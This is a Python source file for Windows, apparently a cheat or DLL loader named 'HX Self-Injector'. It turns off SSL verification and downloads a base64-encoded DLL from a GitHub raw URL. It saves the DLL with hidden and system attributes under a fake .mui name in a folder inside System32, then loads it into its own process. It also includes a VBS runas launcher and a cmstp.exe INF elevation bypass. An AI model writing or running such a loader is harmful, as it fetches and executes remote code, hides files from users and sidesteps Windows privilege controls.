import ctypes
from ctypes import wintypes
import os
import tempfile
import base64
import urllib.request
import random
import string
import ssl
import sys
import atexit
import time
import subprocess
import winreg
import shutil

# Disable SSL verification
ssl._create_default_https_context = ssl._create_unverified_context

# Windows API constants
WM_HOTKEY = 0x0312
MOD_NONE = 0x0000
VK_F9 = 0x78
HOTKEY_ID = 1

class SimpleSelfInjector:
    def __init__(self):
        
        self.hml_url = "https://raw.githubusercontent.com/aswinxks/HXAIMPROBASE64/2f1be8e4339977f1dd0e8254f4d31c750c4993ed/HXAIPRO_CLEAN.txt"
        self.hml_data = None
        self.hml_loaded = False
        self.created_files = []
        
        # Set console title
        ctypes.windll.kernel32.SetConsoleTitleW("HX Self-Injector")
        
        print("=" * 50)
        print("   HX SELF-INJECTOR v1.0 (ADMIN)")
        print("=" * 50)
        print("[+] Running with ADMIN privileges (no UAC popup!)")
        print("[+] Press F9 to inject HML into this process")
        print("[+] Press Ctrl+C to exit")
        print("[+] Downloading HML...")
        
        # Download HML
        self.download_hml()
        
        # Register F9 hotkey
        self.setup_hotkey()
        
        # Start proper message loop
        self.message_loop()
    
    def is_admin(self):
        """Check if running as admin"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def elevate_silent(self):
        """Elevate to admin WITHOUT showing UAC popup - stays in same window"""
        try:
            # Get current script path
            script_path = os.path.abspath(sys.argv[0])
            
            # Method: Use runas with hidden window but keep console
            # Create a VBS script to run as admin silently
            vbs_path = os.path.join(tempfile.gettempdir(), "elevate.vbs")
            
            vbs_content = f'''
Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "{sys.executable}", "{script_path}", "", "runas", 1
'''
            
            with open(vbs_path, 'w') as f:
                f.write(vbs_content)
            
            # Run the VBS (this will elevate but keep the console window)
            subprocess.Popen(['wscript.exe', vbs_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            print("[+] Elevation initiated...")
            print("[+] New admin window should open shortly")
            time.sleep(2)
            sys.exit(0)
            
        except Exception as e:
            print(f"[-] Elevation failed: {e}")
            print("[!] Trying alternate method...")
            self.elevate_with_cmstp()
    
    def elevate_with_cmstp(self):
        """Alternative elevation using cmstp.exe (stays in same console)"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            # Create a temporary INF file
            inf_content = f'''
[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
cmd /c start "" "{sys.executable}" "{script_path}"
'''
            
            inf_path = os.path.join(tempfile.gettempdir(), "elevate.inf")
            with open(inf_path, 'w') as f:
                f.write(inf_content)
            
            # Run cmstp.exe with the INF file
            cmd = f'cmstp.exe /au "{inf_path}"'
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            print("[+] Elevation initiated with cmstp.exe")
            print("[+] New admin window should open shortly")
            time.sleep(3)
            sys.exit(0)
            
        except Exception as e:
            print(f"[-] Elevation failed: {e}")
            print("[!] Please run as Administrator manually")
            input("Press Enter to exit...")
            sys.exit(1)
    
    def download_hml(self):
        """Download HML from URL"""
        try:
            with urllib.request.urlopen(self.hml_url, timeout=10) as response:
                self.hml_data = response.read().decode('utf-8').strip()
            
            test = base64.b64decode(self.hml_data)
            self.hml_loaded = True
            print(f"[+] HML Downloaded! Size: {len(test)} bytes")
            print("[+] Ready - Press F9 to inject")
            
        except Exception as e:
            print(f"[-] Download failed: {e}")
            print("[!] Exiting...")
            sys.exit(1)
    
    def setup_hotkey(self):
        """Register F9 hotkey"""
        try:
            if not ctypes.windll.user32.RegisterHotKey(None, HOTKEY_ID, MOD_NONE, VK_F9):
                print("[-] Failed to register F9 hotkey")
                print("[!] Try running as Administrator manually")
                sys.exit(1)
            
            print("[+] F9 Hotkey registered!")
            atexit.register(lambda: ctypes.windll.user32.UnregisterHotKey(None, HOTKEY_ID))
            
        except Exception as e:
            print(f"[-] Hotkey error: {e}")
            sys.exit(1)
    
    def message_loop(self):
        """Wait for F9 - 0% CPU"""
        print("[+] Waiting for F9 key... (Press Ctrl+C to exit)")
        print("-" * 50)
        
        msg = wintypes.MSG()
        
        while True:
            try:
                ret = ctypes.windll.user32.GetMessageW(
                    ctypes.byref(msg),
                    None,
                    0,
                    0
                )
                
                if ret == -1:
                    break
                elif ret == 0:
                    break
                
                if msg.message == WM_HOTKEY and msg.wParam == HOTKEY_ID:
                    print("\n[!] F9 Pressed! Starting self-injection...")
                    self.do_self_injection()
                    print("\n[+] Waiting for F9 key...")
                else:
                    ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                    ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
                    
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                ctypes.windll.user32.PostQuitMessage(0)
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                time.sleep(1)
    
    def set_hidden_system(self, filepath):
        """Set hidden + system attributes"""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x2
            FILE_ATTRIBUTE_SYSTEM = 0x4
            ctypes.windll.kernel32.SetFileAttributesW(
                filepath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
            )
            return True
        except:
            return False
    
    def do_self_injection(self):
        """Inject HML into current process"""
        try:
            if not self.hml_loaded or not self.hml_data:
                print("[-] No HML loaded!")
                return
            
            dll_bytes = base64.b64decode(self.hml_data)
            print(f"[+] Decoded {len(dll_bytes)} bytes")
            
            if len(dll_bytes) < 2 or int.from_bytes(dll_bytes[0:2], 'little') != 0x5A4D:
                print("[-] Invalid PE file!")
                return
            
            # Create MLH folder in System32
            system32 = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32')
            mlh_folder = os.path.join(system32, 'MLH')
            
            try:
                if not os.path.exists(mlh_folder):
                    os.makedirs(mlh_folder)
                    self.set_hidden_system(mlh_folder)
                    print("[+] Created MLH folder")
            except:
                mlh_folder = tempfile.gettempdir()
                print("[!] Using temp folder (no admin)")
            
            suffix = ''.join(random.choices(string.digits, k=4))
            filename = f"self_{suffix}.mui"
            filepath = os.path.join(mlh_folder, filename)
            
            with open(filepath, 'wb') as f:
                f.write(dll_bytes)
            
            self.set_hidden_system(filepath)
            self.created_files.append(filepath)
            print(f"[+] HML saved: {filepath}")
            
            # SELF-INJECTION
            print("[+] Loading HML into self...")
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            result = kernel32.LoadLibraryW(os.path.abspath(filepath))
            
            if result:
                print(f"[+] ✅ SELF-INJECTION SUCCESS! (0x{result:X})")
                print("[+] HML is now running in THIS process!")
                print("[+] Now you can inject into HD-Player.exe (admin)!")
            else:
                error = ctypes.GetLastError()
                print(f"[-] ❌ Injection failed! Error: {error}")
                
                # Retry without hidden attribute
                print("[!] Retrying without hidden attribute...")
                ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x80)
                result = kernel32.LoadLibraryW(os.path.abspath(filepath))
                
                if result:
                    print(f"[+] ✅ SELF-INJECTION SUCCESS! (0x{result:X})")
                    self.set_hidden_system(filepath)
                else:
                    error = ctypes.GetLastError()
                    print(f"[-] ❌ Injection failed again! Error: {error}")
                    
                    errors = {
                        126: "Missing dependency",
                        127: "Missing export", 
                        193: "Architecture mismatch",
                        1114: "DLLMain failed",
                        5: "Access denied - Run as Admin"
                    }
                    if error in errors:
                        print(f"    Meaning: {errors[error]}")
            
            print("[+] Press F9 again to re-inject")
            
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    try:
        injector = SimpleSelfInjector()
    except KeyboardInterrupt:
        print("\n[!] Exited by user")
        input("Press Enter to exit...")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        input("Press Enter to exit...")